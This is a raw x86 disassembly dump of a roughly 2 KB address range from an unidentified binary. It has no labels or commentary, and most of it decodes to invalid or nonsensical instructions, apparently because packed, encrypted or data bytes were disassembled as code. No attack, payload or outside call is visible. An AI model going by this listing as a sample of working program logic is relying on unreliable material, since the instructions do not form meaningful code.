  4030af:	fs ja  0x403129
  4030b2:	sbb    al,0x7d
  4030b4:	add    edi,ebp
  4030b6:	stos   DWORD PTR es:[edi],eax
  4030b7:	push   es
  4030b8:	ins    BYTE PTR es:[edi],dx
  4030b9:	fbld   TBYTE PTR [ecx+0x22]
  4030bc:	pop    eax
  4030bd:	mov    dl,0x10
  4030bf:	inc    ecx
  4030c0:	mov    al,0x3f
  4030c2:	sar    BYTE PTR [edi],cl
  4030c4:	jae    0x4030b3
  4030c6:	jle    0x40307a
  4030c8:	xchg   esp,eax
  4030c9:	dec    ecx
  4030ca:	xor    DWORD PTR [ecx+0x7c],0x40
  4030ce:	repz pop edi
  4030d0:	push   ds
  4030d1:	nop
  4030d2:	and    eax,0xb30b2b09
  4030d7:	adc    DWORD PTR es:[edi+esi*8+0x5],esi
  4030dc:	xor    BYTE PTR [edi+0x34],dl
  4030df:	mov    ah,0xe3
  4030e1:	clc    
  4030e2:	icebp  
  4030e3:	retf   
  4030e4:	popa   
  4030e5:	call   0xdee8:0x4fb0cfd1
  4030ec:	inc    edx
  4030ed:	jmp    0x4030e6
  4030ef:	js     0x4030cc
  4030f1:	enter  0xae7a,0x64
  4030f5:	jne    0x403118
  4030f7:	add    BYTE PTR [edx+0x4],ch
  4030fa:	ja     0x403113
  4030fc:	addr16 mov eax,0xebb0f6cf
  403102:	scas   eax,DWORD PTR es:[edi]
  403103:	imul   edx,edx,0xf59147c
  403109:	in     eax,dx
  40310a:	mov    ds:0xef40dd24,al
  40310f:	sub    BYTE PTR [edi+edi*4],cl
  403112:	call   0x9005b7e4
  403117:	in     al,0xa1
  403119:	int    0x6
  40311b:	outs   dx,BYTE PTR ds:[esi]
  40311c:	(bad)  
  40311d:	lahf   
  40311e:	jl     0x40311d
  403120:	imul   edi,DWORD PTR [ecx],0x811fc863
  403126:	loopne 0x40312b
  403128:	ins    BYTE PTR es:[edi],dx
  403129:	pop    DWORD PTR [ecx]
  40312b:	daa    
  40312c:	xchg   ebx,eax
  40312d:	jge    0x4030fb
  40312f:	dec    edx
  403130:	repnz outs dx,DWORD PTR ds:[esi]
  403132:	mov    edx,0xf516d796
  403137:	add    esi,edx
  403139:	lods   al,BYTE PTR ds:[esi]
  40313a:	sbb    BYTE PTR [ecx-0x23ba74ff],cl
  403140:	mov    ecx,DWORD PTR [ebp-0x8]
  403143:	mov    DWORD PTR [ecx+0x4],eax
  403146:	mov    eax,DWORD PTR [ebp-0x20]
  403149:	mov    ecx,DWORD PTR [ebp-0x8]
  40314c:	mov    DWORD PTR [ecx+0x8],eax
  40314f:	mov    eax,DWORD PTR [ebp-0x34]
  403152:	mov    ecx,DWORD PTR [ebp-0x8]
  403155:	mov    DWORD PTR [ecx+0xc],eax
  403158:	mov    eax,DWORD PTR [ebp-0x30]
  40315b:	jmp    0x403569
  403160:	mov    esi,ss
  403162:	jmp    0x4031a7
  403164:	jno    0x4031c9
  403166:	mov    ah,0xd1
  403168:	cs out 0xa4,al
  40316b:	mov    ch,0xd1
  40316d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40316e:	repnz (bad) 
  403170:	mov    DWORD PTR ds:0x7d6f7e7e,edx
  403176:	jle    0x4031f6
  403178:	xchg   BYTE PTR [edx+0x60],ah
  40317b:	retf   
  40317c:	pop    eax
  40317d:	data16 or dh,BYTE PTR [eax-0x7d9eaab3]
  403184:	and    dh,BYTE PTR [ebx+0x5c]
  403187:	gs arpl dx,cx
  40318a:	add    BYTE PTR [edi-0x47],ah
  40318d:	cdq    
  40318e:	jp     0x403114
  403190:	sub    ah,al
  403192:	add    eax,0xde5de774
  403197:	ficomp DWORD PTR [esi+ecx*1]
  40319a:	add    DWORD PTR [ecx],esp
  40319c:	das    
  40319d:	sbb    ah,BYTE PTR [esi-0x42]
  4031a0:	adc    al,0x57
  4031a2:	into   
  4031a3:	aas    
  4031a4:	cmp    edx,eax
  4031a6:	ds or  al,0x87
  4031a9:	popa   
  4031aa:	fucomip st,st(7)
  4031ac:	cdq    
  4031ad:	jno    0x403135
  4031af:	inc    edx
  4031b0:	ret    0x4779
  4031b3:	push   ss
  4031b4:	ss inc eax
  4031b6:	hlt    
  4031b7:	loopne 0x403205
  4031b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031ba:	sub    BYTE PTR [ebx-0x5d],dh
  4031bd:	push   edi
  4031be:	shl    ecx,0x93
  4031c1:	xchg   DWORD PTR [ebx-0x11],edx
  4031c4:	call   0xdf803147
  4031c9:	or     DWORD PTR [esi-0xb],edx
  4031cc:	cmp    al,0x90
  4031ce:	mov    al,0x97
  4031d0:	cld    
  4031d1:	ss jne 0x403237
  4031d4:	push   esp
  4031d5:	dec    ecx
  4031d6:	sahf   
  4031d7:	push   ebp
  4031d8:	jl     0x4031f6
  4031da:	and    ebp,DWORD PTR ds:0x8ac8d89
  4031e0:	mov    dl,0x39
  4031e2:	cmovae ecx,DWORD PTR [ecx]
  4031e5:	sub    eax,0xee7eb404
  4031ea:	loop   0x4031e1
  4031ec:	ins    DWORD PTR es:[edi],dx
  4031ed:	inc    edi
  4031ee:	or     bl,dh
  4031f0:	add    ch,BYTE PTR [eax-0x60]
  4031f3:	stos   BYTE PTR es:[edi],al
  4031f4:	xor    cl,cl
  4031f6:	jns    0x4031af
  4031f8:	mov    ebp,0xa5200c14
  4031fd:	and    BYTE PTR [eax+edx*4-0x53],0x49
  403202:	push   ebx
  403203:	int3   
  403204:	data16 stc 
  403206:	lea    eax,[esi+0x1dc18eda]
  40320c:	and    DWORD PTR [esi+0x30a37013],esp
  403212:	mov    al,0xb2
  403214:	mov    al,ds:0xf31cda3d
  403219:	pop    esp
  40321a:	add    al,0x33
  40321c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40321d:	xchg   esi,eax
  40321e:	scas   eax,DWORD PTR es:[edi]
  40321f:	add    ebx,DWORD PTR [ecx]
  403221:	pop    ebx
  403222:	cdq    
  403223:	sub    edi,0xffffff94
  403226:	popa   
  403227:	push   edi
  403228:	mov    esp,0x4a99ccb0
  40322d:	jmp    0xa885:0x4989af54
  403234:	bt     esp,ebx
  403237:	mov    WORD PTR [edx],fs
  403239:	das    
  40323a:	clc    
  40323b:	nop
  40323c:	loopne 0x40321d
  40323e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40323f:	cs and ebx,eax
  403242:	adc    eax,0x5d10522e
  403247:	daa    
  403248:	push   edx
  403249:	or     BYTE PTR [ecx-0x5f9808b3],ch
  40324f:	mov    bh,BYTE PTR [esi-0x5f]
  403252:	xor    BYTE PTR [esi],ah
  403254:	loope  0x4031e1
  403256:	inc    eax
  403257:	je     0x40328b
  403259:	jp     0x4032a9
  40325b:	adc    esp,DWORD PTR [ebp-0x60]
  40325e:	mov    cl,0xe5
  403260:	outs   dx,DWORD PTR ds:[esi]
  403261:	add    DWORD PTR [ecx+0x66f6191],edx
  403267:	cmp    esi,DWORD PTR [ecx]
  403269:	xchg   BYTE PTR [edi+ecx*4-0x2e],ch
  40326d:	div    BYTE PTR [edx+0x49]
  403270:	es in  al,0x6d
  403273:	js     0x4032e4
  403275:	mov    ch,0x53
  403277:	add    ch,cl
  403279:	mov    cl,0x91
  40327b:	call   0xfcdd:0x35a9edf0
  403282:	inc    esp
  403283:	pusha  
  403284:	stos   BYTE PTR es:[edi],al
  403285:	sub    DWORD PTR [eax-0x7722921b],ebx
  40328b:	or     ebx,esi
  40328d:	inc    ebx
  40328e:	cld    
  40328f:	dec    eax
  403290:	jge    0x4032ee
  403292:	mov    esp,0x7d874c9f
  403297:	push   ds
  403298:	imul   eax,DWORD PTR [eax],0x196d0ad2
  40329e:	jl     0x40322c
  4032a0:	fisub  DWORD PTR [ebp+0x4f0c5c6a]
  4032a6:	sbb    edx,DWORD PTR [ecx+0x2e3fbe6b]
  4032ac:	test   eax,0x739f054a
  4032b1:	scas   al,BYTE PTR es:[edi]
  4032b2:	retf   
  4032b3:	pop    ebx
  4032b4:	and    dl,BYTE PTR [edx]
  4032b6:	jae    0x40324a
  4032b8:	push   edi
  4032b9:	push   eax
  4032ba:	(bad)
  4032bd:	jecxz  0x4032b3
  4032bf:	les    edi,FWORD PTR [esi+0x5e91b76]
  4032c5:	ss cmp al,0x9f
  4032c8:	es pop ecx
  4032ca:	loope  0x4032aa
  4032cc:	sahf   
  4032cd:	dec    esi
  4032ce:	sub    dh,BYTE PTR [esi+0x562efe7d]
  4032d4:	mov    esi,0x768e28a2
  4032d9:	js     0x403265
  4032db:	fild   DWORD PTR [ecx+edi*1+0x77]
  4032df:	imul   ebx,esi,0x7a305017
  4032e5:	lahf   
  4032e6:	repz adc eax,eax
  4032e9:	sahf   
  4032ea:	adc    eax,0x3a3a4884
  4032ef:	iret   
  4032f0:	add    al,0xeb
  4032f2:	stc    
  4032f3:	cs cld 
  4032f5:	daa    
  4032f6:	(bad)  
  4032f7:	loopne 0x4032a9
  4032f9:	mov    edi,0xd3e2e923
  4032fe:	mov    ds:0xb1169883,al
  403303:	jmp    0x4032de
  403305:	cmc    
  403306:	jp     0x403322
  403308:	je     0x4032e8
  40330a:	xor    dl,0x9
  40330d:	jnp    0x4032bf
  40330f:	loopne 0x4032f1
  403311:	in     al,0x1a
  403313:	mov    al,ds:0x6559fc93
  403318:	jne    0x403386
  40331a:	xor    DWORD PTR [ecx],ebx
  40331c:	pop    ds
  40331d:	xchg   edi,eax
  40331e:	push   edx
  40331f:	hlt    
  403320:	test   eax,0x11fbd46e
  403325:	push   0xfffffffb
  403327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403328:	mov    dl,0xf8
  40332a:	jmp    0x1b333e6c
  40332f:	frstorw ds:0x4768e65e
  403336:	cmp    BYTE PTR [edi-0x7267aa06],cl
  40333c:	jle    0x40330d
  40333e:	inc    eax
  40333f:	dec    eax
  403340:	iret   
  403341:	jb     0x4032f0
  403343:	mov    edi,0xd15b1c70
  403348:	das    
  403349:	jp     0x40338b
  40334b:	scas   eax,DWORD PTR es:[edi]
  40334c:	pop    edx
  40334d:	push   ecx
  40334e:	mov    WORD PTR [ebx-0x52],ds
  403351:	test   eax,0xa6ac406c
  403356:	ror    BYTE PTR [esi],0xf5
  403359:	add    ah,BYTE PTR [ebp-0x2a4e435c]
  40335f:	mov    esp,edx
  403361:	add    esp,DWORD PTR [ebp-0x1c]
  403364:	retf   0xb895
  403367:	jle    0x4033d8
  403369:	push   0xe80c2c6a
  40336e:	jns    0x403344
  403370:	pushf  
  403371:	clc    
  403372:	inc    ebp
  403373:	adc    BYTE PTR [ecx-0x12],dh
  403376:	sub    DWORD PTR [esi-0x53f4126f],ecx
  40337c:	and    DWORD PTR [esi+0x3c],ebp
  40337f:	inc    eax
  403380:	xor    DWORD PTR [ebp+ecx*8+0x7b306f23],ebp
  403387:	mov    cl,0x9b
  403389:	cmp    ecx,esp
  40338b:	jge    0x4033fa
  40338d:	lods   al,BYTE PTR ds:[esi]
  40338e:	mov    cl,0x82
  403390:	sbb    eax,0xc363ba37
  403395:	mov    dl,0x83
  403397:	dec    BYTE PTR [ebp-0x74d276ea]
  40339d:	les    ebp,FWORD PTR [edx-0x52145961]
  4033a3:	pop    esi
  4033a4:	clc    
  4033a5:	jmp    0x34f4dfa
  4033aa:	mov    eax,ds:0x866ae251
  4033b0:	jmp    0x6f6f3e26
  4033b5:	(bad)
  4033bb:	(bad)  
  4033bc:	jge    0x4033f1
  4033be:	pusha  
  4033bf:	pop    ds
  4033c0:	(bad)
  4033c5:	pop    eax
  4033c6:	aas    
  4033c7:	fs push ss
  4033c9:	jmp    0x2fc5a1
  4033ce:	pop    ebp
  4033cf:	mov    bl,0x81
  4033d1:	shr    DWORD PTR [edx],1
  4033d3:	add    eax,0x6af8a243
  4033d8:	cmp    BYTE PTR [ecx+0x591073ab],dh
  4033de:	xchg   ebx,eax
  4033df:	test   DWORD PTR [edi-0x7213f5d5],ebx
  4033e5:	jno    0x4033e2
  4033e7:	pop    ecx
  4033e8:	cmp    DWORD PTR [ecx-0x15],0x7c
  4033ec:	pop    es
  4033ed:	or     DWORD PTR [edi-0x6d],esp
  4033f0:	push   ds
  4033f1:	jle    0x403392
  4033f3:	cwde   
  4033f4:	push   0xffffffd2
  4033f6:	cmc    
  4033f7:	cmp    eax,0xaa713057
  4033fc:	retf   0xdc7d
  4033ff:	push   ss
  403400:	cld    
  403401:	jmp    0x4033e6
  403403:	inc    esi
  403404:	add    esi,esp
  403406:	mov    edx,0x2bd0c451
  40340b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40340c:	adc    eax,0x44806e0d
  403411:	jns    0x403434
  403413:	sahf   
  403414:	inc    esp
  403415:	test   edx,0x8f676f4e
  40341b:	adc    eax,0x55f8bc75
  403420:	xor    al,0xfb
  403422:	add    BYTE PTR [edx+0x53],ah
  403425:	inc    edx
  403426:	stos   DWORD PTR es:[edi],eax
  403427:	sub    ebp,ebx
  403429:	das    
  40342a:	aaa    
  40342b:	inc    ecx
  40342c:	out    dx,al
  40342d:	sbb    eax,0x1b7fed77
  403432:	clc    
  403433:	pop    ss
  403434:	aad    0x7e
  403436:	push   esi
  403437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403438:	jb     0x40348d
  40343a:	out    dx,al
  40343b:	jnp    0x40349a
  40343d:	call   0x4281dd44
  403442:	push   ecx
  403443:	push   ebp
  403444:	jmp    0x14fc:0x2e48b6d3
  40344b:	jbe    0x4033e1
  40344d:	dec    esi
  40344e:	jnp    0x40346f
  403450:	mov    cl,0x60
  403452:	les    edi,FWORD PTR [ebp+0x65498b5f]
  403458:	or     DWORD PTR [ecx],edx
  40345a:	dec    ebx
  40345b:	cmp    al,0xbb
  40345d:	jmp    0xd683a0f5
  403462:	mov    esi,0xfbdf49d7
  403467:	cmp    DWORD PTR [edi-0x8],0xe8d8d331
  40346e:	rcl    ebp,cl
  403470:	cmp    DWORD PTR [eax],eax
  403472:	rcr    ch,1
  403474:	jne    0x4034c1
  403476:	sbb    ebx,esi
  403478:	in     eax,0x7d
  40347a:	mov    ds:0x80f11aa3,eax
  40347f:	sub    ecx,DWORD PTR [eax-0x11]
  403482:	inc    edi
  403483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403484:	dec    ebx
  403485:	imul   esi,DWORD PTR [eax+0x8],0xffffff90
  403489:	jnp    0x4034f5
  40348b:	leave  
  40348c:	sahf   
  40348d:	jns    0x403476
  40348f:	mov    ch,0x1d
  403491:	sub    DWORD PTR [ecx+0x3],ebp
  403494:	je     0x4034dc
  403496:	and    al,0x3a
  403498:	shr    BYTE PTR [ebp-0x246051e],1
  40349e:	stos   DWORD PTR es:[edi],eax
  40349f:	in     eax,0x5b
  4034a1:	in     al,dx
  4034a2:	mov    ds:0xb8863b45,eax
  4034a7:	cmp    ch,bh
  4034a9:	add    bh,BYTE PTR [ebx+0x22219092]
  4034af:	cmp    eax,0x575a9ea4
  4034b4:	push   es
  4034b5:	or     eax,0x2131402b
  4034ba:	inc    ebx
  4034bb:	popa   
  4034bc:	ds das 
  4034be:	mov    bh,0x4
  4034c0:	cwde   
  4034c1:	in     al,dx
  4034c2:	mov    DWORD PTR ds:0xb560a464,0xf9ec57a2
  4034cc:	ss test al,0x54
  4034cf:	mov    ds:0xf552bb46,eax
  4034d4:	cwde   
  4034d5:	pop    ebp
  4034d6:	arpl   WORD PTR [ebx],di
  4034d8:	scas   eax,DWORD PTR es:[edi]
  4034d9:	popa   
  4034da:	xchg   esp,eax
  4034db:	xor    edi,ebx
  4034dd:	mov    al,0x7e
  4034df:	xchg   esi,eax
  4034e0:	retf   
  4034e1:	mov    WORD PTR [ebp+0x365ff2a1],cs
  4034e7:	and    eax,DWORD PTR [ecx+0x65]
  4034ea:	xchg   esi,eax
  4034eb:	stos   DWORD PTR es:[edi],eax
  4034ec:	sbb    bh,BYTE PTR [edx]
  4034ee:	or     eax,0x95003445
  4034f3:	mov    edi,0xc836ea3f
  4034f8:	or     dl,BYTE PTR [esi-0x64]
  4034fb:	jge    0x403492
  4034fd:	call   0xa8ba:0xefcd2db7
  403504:	mov    ebx,0xb919cb22
  403509:	and    al,0x4d
  40350b:	push   edx
  40350c:	push   eax
  40350d:	mov    bl,0x2
  40350f:	and    al,0x4b
  403511:	inc    edx
  403512:	jae    0x40350b
  403514:	(bad)  
  403515:	pop    edx
  403516:	repnz mov ebx,0x87e987e0
  40351c:	pop    edx
  40351d:	std    
  40351e:	mov    gs,WORD PTR [edx+0x24fd7848]
  403524:	jb     0x40355f
  403526:	mov    bl,0xbb
  403528:	stc    
  403529:	arpl   WORD PTR [edi-0x7bdeb2b6],cx
  40352f:	dec    ecx
  403530:	mov    ah,0x5e
  403532:	push   ss
  403533:	push   eax
  403534:	add    BYTE PTR [ecx],dl
  403536:	cmp    DWORD PTR [ebx+ecx*1-0x1d],esi
  40353a:	(bad)  
  40353b:	cmp    cl,BYTE PTR [edi-0x45]
  40353e:	jbe    0x4035b9
  403540:	mov    eax,DWORD PTR [eax]
  403542:	cmc    
  403543:	cmp    al,0x5d
  403545:	mov    cl,0xc7
  403547:	in     al,0x12
  403549:	dec    ecx
  40354a:	(bad)  
  40354b:	repnz cli 
  40354d:	sti    
  40354e:	jb     0x403517
  403550:	sbb    bh,dl
  403552:	lods   al,BYTE PTR ds:[esi]
  403553:	fstp   DWORD PTR [ecx]
  403555:	mov    ah,BYTE PTR [esi+0x7059ba90]
  40355b:	dec    eax
  40355c:	add    dl,dh
  40355e:	test   ebp,ebp
  403560:	shr    bl,1
  403562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403563:	outs   dx,DWORD PTR ds:[esi]
  403564:	pop    edx
  403565:	or     ecx,DWORD PTR [edi+esi*2]
  403568:	mov    al,ds:0x89f84d8b
  40356d:	inc    ecx
  40356e:	adc    BYTE PTR [ebx-0x23ba7440],cl
  403574:	test   eax,eax
  403576:	mov    eax,DWORD PTR [ebp-0x2c]
  403579:	jne    0x403582
  40357f:	mov    eax,DWORD PTR [ebp-0x10]
  403582:	xor    eax,esi
  403584:	add    eax,edi
  403586:	jmp    0x403994
  40358b:	in     eax,dx
  40358c:	adc    ch,ch
  40358e:	ret    0xe3f1
  403591:	icebp  
  403592:	xor    DWORD PTR [eax],ebx
  403594:	xchg   esi,eax
  403595:	sbb    esp,edx
  403597:	push   0x86048034
  40359c:	adc    DWORD PTR [esi+0x7e],edi
  40359f:	outs   dx,DWORD PTR ds:[esi]
  4035a0:	jge    0x403620
  4035a2:	jle    0x403595
  4035a4:	mov    ds:0x54d46d8e,al
  4035a9:	mov    ah,0x47
  4035ab:	mov    bl,0x79
  4035ad:	cli    
  4035ae:	pop    esp
  4035af:	xlat   BYTE PTR ds:[ebx]
  4035b0:	mov    ds:0x4690bdb,eax
  4035b5:	pop    eax
  4035b6:	mov    edi,0xd6d103b9
  4035bb:	push   edi
  4035bc:	mov    edx,DWORD PTR [eax+0x2]
  4035bf:	mov    ds:0xc6a18546,eax
  4035c4:	inc    esi
  4035c5:	add    ebp,ebp
  4035c7:	in     eax,dx
  4035c8:	mov    ch,0xd2
  4035ca:	pop    esi
  4035cb:	shr    BYTE PTR [edx],cl
  4035cd:	mov    ecx,0x29f8503c
  4035d2:	loop   0x4035bc
  4035d4:	pop    es
  4035d5:	ins    BYTE PTR es:[edi],dx
  4035d6:	lods   al,BYTE PTR ds:[esi]
  4035d7:	cmp    al,cl
  4035d9:	(bad)  
  4035da:	jmp    0x40360d
  4035dc:	sbb    DWORD PTR [esi],0x60edf7df
  4035e2:	cdq    
  4035e3:	loope  0x403631
  4035e5:	rol    dh,0xc3
  4035e8:	inc    edx
  4035e9:	add    edx,DWORD PTR [eax-0xce2ea56]
  4035ef:	shl    ecx,0xa6
  4035f2:	pop    ebp
  4035f3:	dec    eax
  4035f4:	adc    esp,DWORD PTR gs:[edi]
  4035f7:	xchg   DWORD PTR [esi],ecx
  4035f9:	icebp  
  4035fa:	mov    cl,0xfb
  4035fc:	lahf   
  4035fd:	ds jg  0x4035d7
  403600:	inc    esp
  403601:	enter  0xc553,0x1a
  403605:	lods   eax,DWORD PTR ds:[esi]
  403606:	jo     0x4035c7
  403608:	iret   
  403609:	sbb    cl,BYTE PTR [ebx-0x560d263f]
  40360f:	add    BYTE PTR ds:0x438bdebd,cl
  403615:	dec    ebp
  403616:	je     0x403621
  403618:	test   ecx,esi
  40361a:	jne    0x403699
  40361c:	jp     0x4035f5
  40361e:	or     al,0x76
  403620:	sub    ebx,ecx
  403622:	inc    eax
  403623:	ffreep st(3)
  403625:	xchg   esp,eax
  403626:	adc    BYTE PTR [edx-0x70],dl
  403629:	and    BYTE PTR [ebx],cl
  40362b:	adc    al,0xe8
  40362d:	hlt    
  40362e:	daa    
  40362f:	nop
  403630:	pop    ecx
  403631:	push   ebx
  403632:	loope  0x403621
  403634:	(bad)  
  403635:	sub    eax,0x8a4ee2fd
  40363a:	rcr    bl,cl
  40363c:	iret   
  40363d:	ficom  WORD PTR [eax+0x36]
  403640:	mov    dh,0xf9
  403642:	xchg   esi,eax
  403643:	pop    ds
  403644:	test   BYTE PTR [edi-0xe],bh
  403647:	mov    ah,BYTE PTR [ebx+0x59]
  40364a:	sti    
  40364b:	sar    DWORD PTR [ebp+0x65],cl
  40364e:	or     BYTE PTR [ecx],al
  403650:	test   BYTE PTR [edi+0x7a32ad97],0x88
  403657:	es shl al,0x4b
  40365b:	ds xchg ebp,eax
  40365d:	call   0x6d6ca9dc
  403662:	popa   
  403663:	xchg   DWORD PTR [ecx],ebx
  403665:	test   al,0x27
  403667:	ds daa 
  403669:	jmp    0x40369f
  40366b:	push   es
  40366c:	cli    
  40366d:	add    al,al
  40366f:	mov    bl,BYTE PTR [edx+0x59]
  403672:	jmp    DWORD PTR [ebx]
  403674:	cmp    DWORD PTR [edx+0x10],eax
  403677:	lods   al,BYTE PTR ds:[esi]
  403678:	push   ebx
  403679:	dec    esp
  40367a:	je     0x4036e8
  40367c:	pop    esp
  40367d:	inc    esi
  40367e:	test   bh,cl
  403680:	fnsave [edx-0x6ee0508f]
  403686:	sbb    edi,DWORD PTR [esi+eiz*8]
  403689:	adc    BYTE PTR [ebx-0x28c19184],0x2c
  403690:	inc    ebp
  403691:	xadd   BYTE PTR [esi],bh
  403694:	mov    cl,0xa8
  403696:	scas   al,BYTE PTR es:[edi]
  403697:	add    al,0xa8
  403699:	and    DWORD PTR [esi-0x26eaf3c3],ebp
  40369f:	fst    DWORD PTR [ecx]
  4036a1:	push   eax
  4036a2:	and    DWORD PTR [ebp+esi*8-0x5bc72ece],esp
  4036a9:	pop    ecx
  4036aa:	mov    edi,DWORD PTR [edi-0x22]
  4036ad:	push   esp
  4036ae:	(bad)  
  4036af:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4036b1:	sub    eax,0x419f7b9c
  4036b6:	lds    esi,FWORD PTR [esi]
  4036b8:	mov    edx,0xda07dd04
  4036bd:	cmp    al,0x99
  4036bf:	out    0xc9,al
  4036c1:	pop    edi
  4036c2:	lods   eax,DWORD PTR ds:[esi]
  4036c3:	add    eax,DWORD PTR [ecx-0x53]
  4036c6:	rol    BYTE PTR [edi+0x2dd4638b],1
  4036cc:	loop   0x40373f
  4036ce:	nop
  4036cf:	out    0x9a,eax
  4036d1:	jmp    0xbb14:0xd179d932
  4036d8:	push   0xffffffb4
  4036da:	repnz xlat BYTE PTR ds:[ebx]
  4036dc:	ins    DWORD PTR es:[edi],dx
  4036dd:	adc    edi,DWORD PTR [ecx-0x237849ec]
  4036e3:	adc    al,dl
  4036e5:	adc    edi,eax
  4036e7:	in     al,0x8c
  4036e9:	add    BYTE PTR [eax],al
  4036eb:	mov    esi,0x6db1fc31
  4036f0:	cmp    ebx,DWORD PTR ds:0xb04373f3
  4036f6:	dec    ebx
  4036f7:	lock ja 0x4036ab
  4036fa:	hlt    
  4036fb:	push   ss
  4036fc:	xchg   esp,eax
  4036fd:	and    esi,DWORD PTR [ebx-0x7e166afe]
  403703:	xor    al,0xef
  403705:	int3   
  403706:	jbe    0x403706
  403708:	dec    edi
  403709:	push   0x93bbf8eb
  40370e:	out    dx,eax
  40370f:	mov    esp,DWORD PTR [ecx]
  403711:	les    edi,FWORD PTR [edx+0x3a]
  403714:	xchg   ebx,eax
  403715:	shl    BYTE PTR [edx-0x21a88784],0x36
  40371c:	gs sahf 
  40371e:	sbb    BYTE PTR cs:[edi],0xd3
  403722:	xchg   esi,eax
  403723:	or     BYTE PTR cs:[ecx+0x2bbba499],ah
  40372a:	in     al,dx
  40372b:	pop    ss
  40372c:	jae    0x4036b2
  40372e:	test   al,0xd2
  403730:	jge    0x40371c
  403732:	inc    ebx
  403733:	data16 in al,0xcd
  403736:	aad    0xc7
  403738:	fsub   DWORD PTR [edx+0x4cdf92cf]
  40373e:	repz test al,0xe4
  403741:	mov    BYTE PTR [ebx],ah
  403743:	xor    DWORD PTR [ecx+0x6ad450a4],edx
  403749:	inc    edx
  40374a:	hlt    
  40374b:	arpl   bx,di
  40374d:	cmp    al,0xca
  40374f:	leave  
  403750:	call   0x4aca9208
  403755:	sbb    eax,edx
  403757:	dec    ebx
  403758:	mov    dh,0x71
  40375a:	cli    
  40375b:	ja     0x403728
  40375d:	xor    al,0xab
  40375f:	fdivp  st(6),st
  403761:	or     al,0xfa
  403763:	loop   0x4036e5
  403765:	and    bh,BYTE PTR [ecx-0xa2d881f]
  40376b:	or     al,0x76
  40376d:	sub    DWORD PTR [ebx-0x77],esi
  403770:	or     cl,BYTE PTR [ecx]
  403772:	dec    esp
  403773:	dec    ecx
  403774:	or     DWORD PTR [ecx+0x137ef5be],0x39
  40377b:	rcr    DWORD PTR [edx+0x43],0xdf
  40377f:	cli    
  403780:	sub    BYTE PTR [ebp-0x38b5ab62],0xb
  403787:	inc    ecx
  403788:	jb     0x403766
  40378a:	stc    
  40378b:	ss or  ebx,edx
  40378e:	fcmovb st,st(7)
  403790:	fdiv   DWORD PTR [edi+0x27]
  403793:	jno    0x4037f4
  403795:	push   cs
  403796:	out    0x48,eax
  403798:	cmp    DWORD PTR [ebx-0x2a],eax
  40379b:	(bad)  
  40379c:	mov    cl,0x51
  40379e:	xchg   edx,eax
  40379f:	xchg   BYTE PTR [esi-0xf88d4a4],al
  4037a5:	(bad)  
  4037a6:	in     al,0x75
  4037a8:	les    ebp,FWORD PTR [edi+0x2ad60e2a]
  4037ae:	or     DWORD PTR ds:[edi+0x17],edi
  4037b2:	jp     0x403818
  4037b4:	lock imul ebx,DWORD PTR [ebp+0x7a],0x33
  4037b9:	arpl   si,bp
  4037bb:	xor    eax,0xf9513f62
  4037c0:	push   ss
  4037c1:	dec    esp
  4037c2:	adc    BYTE PTR ds:0xcf04da2d,dl
  4037c8:	dec    ebx
  4037c9:	push   ebp
  4037ca:	mov    ds:0x11504045,eax
  4037cf:	loop   0x40376e
  4037d1:	xlat   BYTE PTR ds:[ebx]
  4037d2:	adc    eax,0xdf1c97f4
  4037d7:	pop    edi
  4037d8:	stos   BYTE PTR es:[edi],al
  4037d9:	xchg   edx,eax
  4037da:	ins    DWORD PTR es:[edi],dx
  4037db:	mov    ebx,0x9300acdd
  4037e0:	repz xor BYTE PTR [edx],cl
  4037e3:	mov    ds:0x795450,al
  4037e8:	mov    ecx,0x9d272e
  4037ed:	cmp    al,0x57
  4037ef:	fwait
  4037f0:	pop    ebp
  4037f1:	xchg   ebx,eax
  4037f2:	fnstenv ds:0xd759ff31
  4037f8:	adc    ebx,DWORD PTR [ebp-0x1f1ccdee]
  4037fe:	fs ds test al,0xc6
  403802:	mov    es,WORD PTR [edx]
  403804:	sub    ebx,ecx
  403806:	mov    ds:0xbd637f30,eax
  40380b:	bound  esi,QWORD PTR [ebx]
  40380d:	jl     0x403886
  40380f:	or     ebp,DWORD PTR [ebx]
  403811:	and    eax,0xfc609a10
  403816:	push   ss
  403817:	mov    ah,0x86
  403819:	loopne 0x403823
  40381b:	mov    eax,0x503d6f06
  403820:	jnp    0x40384c
  403822:	enter  0x111b,0x0
  403826:	jp     0x4037fb
  403828:	int3   
  403829:	mov    ch,0xeb
  40382b:	jp     0x403856
  40382d:	pop    ebp
  40382e:	bnd jg 0x4037c0
  403831:	sub    eax,0xf1bef4c4
  403836:	(bad)  
  403837:	fwait
  403838:	je     0x4038a0
  40383a:	nop
  40383b:	aas    
  40383c:	xchg   ebx,eax
  40383d:	jmp    0xe84f:0xb3d27007
  403844:	adc    BYTE PTR [ebx-0x3b],ah
  403847:	add    al,bh
  403849:	aaa    
  40384a:	adc    ch,BYTE PTR [edx-0x300977ae]
  403850:	push   ecx
  403851:	pop    ds
  403852:	les    ebp,FWORD PTR [edi+0x2bbc790e]
  403858:	add    al,dh
  40385a:	push   edx
  40385b:	shl    BYTE PTR [ebx-0x3d],1
  40385e:	and    DWORD PTR [ebx+0x1d67d3d6],0x19408243
  403868:	mov    esp,0xf5343a24
  40386d:	cwde   
  40386e:	pop    ss
  40386f:	and    esp,edx
  403871:	(bad)  ds:[edi]
  403874:	sbb    bh,dl
  403876:	push   cs
  403877:	jg     0x4038f7
  403879:	cmc    
  40387a:	std    
  40387b:	xlat   BYTE PTR ds:[ebx]
  40387c:	push   ebp
  40387d:	mov    al,0x51
  40387f:	xor    DWORD PTR [ebx],0xa9ab68eb
  403885:	jmp    0x3d9947f3
  40388a:	lds    edi,FWORD PTR [edx-0x530c165e]
  403890:	ja     0x4038ae
  403892:	retf   
  403893:	sbb    ebp,DWORD PTR [ecx-0x37]
  403896:	addr16 push eax
  403898:	mov    eax,0x574e9da2
  40389d:	jmp    0x217a4354
